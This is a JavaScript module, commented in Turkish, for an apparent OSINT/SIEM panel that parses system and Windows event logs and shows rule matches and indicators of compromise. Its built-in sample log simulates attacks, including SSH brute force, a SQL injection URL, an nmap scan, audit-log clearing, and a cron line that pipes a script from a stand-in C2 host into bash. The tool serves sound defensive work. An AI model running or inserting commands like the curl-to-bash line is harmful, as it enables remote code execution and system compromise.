/* ==========================================================================
   ÜSTAD OSINT — LOG / SIEM ANALİZİ
   auth.log · syslog · Windows olay günlüğü satırlarını çözer, kural eşleştirir
   ========================================================================== */
var Log = (function () {
  'use strict';

  var ORNEK =
    'Sep 25 09:12:41 srv sshd[2211]: Failed password for root from 203.0.113.44 port 51822 ssh2\n' +
    'Sep 25 09:12:42 srv sshd[2211]: Failed password for root from 203.0.113.44 port 51824 ssh2\n' +
    'Sep 25 09:12:43 srv sshd[2211]: Failed password for admin from 203.0.113.44 port 51826 ssh2\n' +
    'Sep 25 09:13:02 srv sshd[2213]: Failed password for admin from 203.0.113.44 port 51830 ssh2\n' +
    'Sep 25 09:13:10 srv sshd[2215]: Failed password for root from 203.0.113.44 port 51833 ssh2\n' +
    'Sep 25 09:13:18 srv sshd[2217]: Failed password for user from 203.0.113.44 port 51840 ssh2\n' +
    'Sep 25 09:13:25 srv sshd[2219]: Failed password for root from 203.0.113.44 port 51844 ssh2\n' +
    'Sep 25 09:13:31 srv sshd[2221]: Failed password for root from 203.0.113.44 port 51848 ssh2\n' +
    'Sep 25 09:13:40 srv sshd[2223]: Failed password for root from 203.0.113.44 port 51852 ssh2\n' +
    'Sep 25 09:14:02 srv sshd[2230]: Accepted password for kenan from 192.168.1.20 port 51900 ssh2\n' +
    'Sep 25 09:15:11 srv sudo:   kenan : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash\n' +
    'Sep 25 09:16:03 srv kernel: [ 9912.11] iptables: DROP IN=eth0 SRC=203.0.113.44 DST=10.0.0.9\n' +
    '2026-09-25 09:19:22 WinEvt 4625 An account failed to log on. Target: Administrator. Source Network Address: 203.0.113.77\n' +
    '2026-09-25 09:20:41 WinEvt 4720 A user account was created. New Account: backup_admin\n' +
    '2026-09-25 09:21:55 WinEvt 1102 The audit log was cleared. Subject: SYSTEM\n' +
    '2026-09-25 09:22:10 nginx: 10.0.0.44 - - "GET /?id=1%27%20UNION%20SELECT%20user,pass%20FROM%20users-- HTTP/1.1" 500\n' +
    '2026-09-25 09:22:31 srv audit: nmap -sS -p 1-1024 10.0.0.0/24 executed by pid 4421\n' +
    '2026-09-25 09:23:04 srv cron: curl http://evil-c2.example.top/p.sh | bash\n';

  function kur() {
    OS.$('logCoz').onclick = coz;
    OS.$('logTemizle').onclick = function () {
      OS.$('logMetin').value = '';
      OS.$('logBulgular').innerHTML = '<div class="bos">Analiz bekleniyor.</div>';
      OS.$('logOzet').innerHTML = '<div class="bos">—</div>';
      OS.balon('✕ Log alanı temizlendi.');
    };
    OS.$('logOrnek').onclick = function () {
      OS.$('logMetin').value = ORNEK;
      OS.balon('📄 Örnek olay günlüğü yüklendi (18 satır, 3 farklı saldırı senaryosu).');
      coz();
    };
    OS.$('logDosya').onchange = function (e) {
      var f = e.target.files[0];
      if (!f) return;
      var o = new FileReader();
      o.onload = function () {
        OS.$('logMetin').value = String(o.result).slice(0, 400000);
        OS.balon('📂 ' + OS.kac(f.name) + ' yüklendi (' + Math.round(f.size / 1024) + ' KB).');
        coz();
      };
      o.readAsText(f, 'utf-8');
    };
  }

  function coz() {
    var metin = OS.$('logMetin').value;
    if (!metin.trim()) { OS.balon('⚠ Önce log metni yapıştır veya dosya seç.', 'kotu'); return; }
    OS.api('/api/logcoz', { yol: 'POST', govde: { metin: metin, kaynak: 'panel' } })
      .then(function (d) {
        if (d.hata) { OS.balon('⚠ ' + OS.kac(d.hata), 'kotu'); return; }
        bulgulariCiz(d);
        ozetCiz(d);
        // IOC'leri IOC kasasına ekle
        if (d.iocler && d.iocler.length) {
          var mevcut = (OS.S.tarama && OS.S.tarama.iocler) || [];
          d.iocler.forEach(function (y) {
            if (!mevcut.some(function (m) { return m.tur === y.tur && m.deger === y.deger; })) mevcut.push(y);
          });
          if (OS.S.tarama) { OS.S.tarama.iocler = mevcut; Alarm.veri(OS.S.tarama); }
        }
        OS.balon('✅ Log çözümlemesi bitti · ' + d.satirSayisi + ' satır · ' + d.bulgular.length + ' bulgu · ' +
          d.iocler.length + ' IOC', d.bulgular.length ? 'iyi' : '');
      }).catch(function (e) { OS.balon('⚠ ' + OS.kac(e.message), 'kotu'); });
  }

  function bulgulariCiz(d) {
    var kap = OS.$('logBulgular');
    if (!d.bulgular.length) { kap.innerHTML = '<div class="bos">Kural eşleşmesi yok — temiz görünüyor.</div>'; return; }
    kap.innerHTML = '';
    d.bulgular.forEach(function (b) {
      var e = document.createElement('div');
      e.className = 'alarm ' + b.onem;
      e.innerHTML =
        '<div class="bas"><b>' + OS.kac(b.baslik) + (b.adet > 1 ? ' ×' + b.adet : '') + '</b>' +
        '<span class="onemEtiket ' + OS.kac(b.onem) + '">' + OS.kac(b.onemEtiket) + '</span></div>' +
        '<div class="govdeYazi">' + OS.kac(b.aciklama) + '</div>' +
        '<div class="kanit">' + OS.kac(b.kanit) + '</div>' +
        '<div class="alt">' +
          (b.ip ? '<span class="etiket">' + OS.kac(b.ip) + '</span>' : '') +
          (b.olayId ? '<span class="etiket">EventID ' + OS.kac(b.olayId) + '</span>' : '') +
          '<span class="etiket">' + OS.kac(b.zaman || '') + '</span>' +
        '</div>';
      kap.appendChild(e);
    });
  }

  function ozetCiz(d) {
    var kap = OS.$('logOzet');
    kap.innerHTML = '';
    var s = d.ozet || {};
    var satirlar = [
      ['SATIR', s.satir], ['KRİTİK', s.kritik], ['YÜKSEK', s.yuksek],
      ['KURAL ÇEŞİDİ', (s.kuralSayaci || []).length]
    ];
    satirlar.forEach(function (x) {
      var e = document.createElement('div');
      e.className = 'satir';
      e.innerHTML = '<span class="etiket">' + OS.kac(x[0]) + '</span><span class="anahtar">' + OS.kac(x[1]) + '</span>';
      kap.appendChild(e);
    });
    (s.kuralSayaci || []).slice(0, 6).forEach(function (k) {
      var e = document.createElement('div');
      e.className = 'satir';
      e.innerHTML = '<span class="anahtar">' + OS.kac(k[0]) + '</span><span class="etiket">' + k[1] + '</span>';
      kap.appendChild(e);
    });
    if ((s.enCokIp || []).length) {
      var b = document.createElement('div');
      b.className = 'madde'; b.innerHTML = '<b>EN ÇOK GÖRÜLEN KAYNAK IP</b>';
      kap.appendChild(b);
      s.enCokIp.forEach(function (x) {
        var e = document.createElement('div');
        e.className = 'satir';
        e.innerHTML = '<span class="anahtar">' + OS.kac(x[0]) + '</span><span class="etiket">' + x[1] + ' satır</span>';
        kap.appendChild(e);
      });
    }
  }

  return { kur: kur, coz: coz };
})();
